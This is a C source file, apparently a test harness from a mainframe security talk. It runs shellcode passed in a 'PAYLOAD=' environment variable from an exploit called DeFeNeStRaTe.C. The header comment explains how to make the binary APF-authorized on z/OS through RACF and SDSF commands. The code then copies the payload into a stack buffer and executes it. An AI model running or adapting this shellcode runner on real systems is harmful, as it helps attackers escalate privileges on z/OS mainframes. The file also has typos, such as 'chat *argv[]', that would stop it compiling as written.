/* Test program to test DeFeNeStRaTe.C

This program is used to demonstrate DeFeNeStRaTe.C and tinyd.c.
To use this program you must:
 1) Create an HFS/ZFS dataset 
  - use ishell option "File_systems" to create the HFS/ZFS
 2) Add that dataset to APF libraries
  - in sdsf "/setprog apf,add,dsname=<HFS/ZFS dataset name>,volume=<ZFS/HFS dataset volume>"
 3) Mount that dataset using TSO MOUNT command
  - MOUNT filesystem('<HFS dataset>') MOUNTPOINT('/APF') TYPE(<HFS or ZFS>)
 4) Give your user account the ability to make APF authorized omvs programs using RACF commands in TSO
  - RDEFINE FACILITY BPX.FILEATTR.APF UACC(NONE)
  - PERMIT BPX.FILEATTR.APF CLASS(FACILITY) ID(<your userid>) ACCESS(READ)
  - SETROPTS RACLIST(FACILITY) REFRESH

Once you've done all that you can compile and set tst APF authorized with:
 xlc -Wc,debug -Wl,AC=1 -o tst tst.c; extattr +a ./tst

Created by Soldier of FORTRAN based on 'hello_world' by BigEndianSmalls:
  https://github.com/zedsec390/defcon23/blob/master/Exploits%20and%20Shellcode/demo_code/hello_world/hi-sc-poc.c

*/

#include <stdio.h>
#include <unistd.h>

extern char **environ;

int main(int argc, chat *argv[]) {
	char dest[240];
  int i, j;
	i = 10;
	j = 1;
	printf(""
         "  _____ ___ _____ \n"
         " |_   _/ __|_   _|\n"
         "   | | \\__ \\ | |  \n"
         "   |_| |___/ |_| \n"
	       "\n");

/* Uncomment this code to see what is stored in your
   environment variable */
/*
	while(i < 236) {
	printf("%.2X",environ[0][i]);
	if(j % 4 == 0) printf(" || %.8x\n",environ[0]+i);
	i++;
	j++;
	}
*/

  if(memcmp(environ[0], "PAYLOAD=", 8) != 0) {
    printf("[!] PAYLOAD= not in environ[0]\n");
    printf("[!] This program must be called by DeFeNeStRaTe.c\n\n");
    return(-1);
  }

  printf("\n[+] Copying Memory\n");
  memcpy(dest,environ[0] + 10 , 236);

  printf("[+] Executing shellcode\n");

  int (*ret)();
	ret = (int(*)())dest;
	(int)(*ret)();
	return 0;
}
